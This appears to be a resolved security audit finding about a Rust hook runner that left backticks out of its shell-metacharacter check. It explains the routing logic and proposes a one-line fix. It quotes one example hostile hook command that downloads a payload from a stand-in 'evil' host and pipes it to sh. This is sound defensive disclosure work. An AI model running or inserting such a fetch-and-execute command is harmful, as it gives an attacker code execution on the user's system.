## Backtick Commands Not Routed Through `sh -c` in Hook Runner

**Status: RESOLVED** (verified in current tree)

` is included in the metachar list:

```rust
let is_shell_command = command_str.contains(' ')
    || command_str.contains('`')  // present
    || ...
```

See: crates/codegen/xai-grok-hooks/src/runner/command.rs ~L78.

**File:** `crates/codegen/xai-grok-hooks/src/runner/command.rs`

**Severity:** Medium

### Description

The hook command runner determines whether to run a command directly or through `sh -c` by checking for shell metacharacters (L78-85):

```rust
let is_shell_command = command_str.contains(' ')
    || command_str.contains('|')
    || command_str.contains('&')
    || command_str.contains(';')
    || command_str.contains('>')
    || command_str.contains('<')
    || command_str.contains('$')
    || command_str.starts_with('~');
```

**Backticks (`` ` ``) are missing from this list.** A hook command like:

```
`curl http://evil/payload | sh`
```

Would be treated as a direct executable path (not routed through `sh -c`), and `command_path.exists()` would correctly return `false` (a backtick isn't valid in a path), returning "command not found". While this particular case is safe (it fails instead of executing), the UX is misleading and it masks potential issues.

More importantly, missing backtick detection means the unresolved-env-var pre-flight check (`find_unresolved_env_vars`) also skips them in some edge cases, and the routing logic is inconsistent — other command-injection characters (`;`, `|`, `&`, `$`) trigger `sh -c` but the historically significant backtick form is treated as a bare path.

### Attack Scenario

Consider a hook command that is dynamically constructed from two parts where a backtick sneaks in:

If the `is_shell_command` check were changed to not check `path.exists()` for some reason, or if a backtick-containing string somehow passed the path check (e.g., on a filesystem that allows backticks in filenames), the command would be executed as a direct binary path rather than via `sh -c`, bypassing shell expansion semantics. The `.exists()` guard currently prevents exploitation, but this is defense-in-depth.

### Outcome

- Confusing "command not found" errors for hook configs that use backtick substitution
- Missing defense-in-depth layer — if any future change modifies the path-existence check, backtick injection could execute without shell sanitation
- Inconsistent behavior: `${VAR}` triggers `sh -c` but `` `cmd` `` does not, even though both are shell substitution mechanisms

### Suggested Fix

Add backtick (`` ` ``) to the shell metacharacter detection at L78:

```rust
let is_shell_command = command_str.contains(' ')
    || command_str.contains('`')
    || command_str.contains('|')
    // ... rest of checks
```
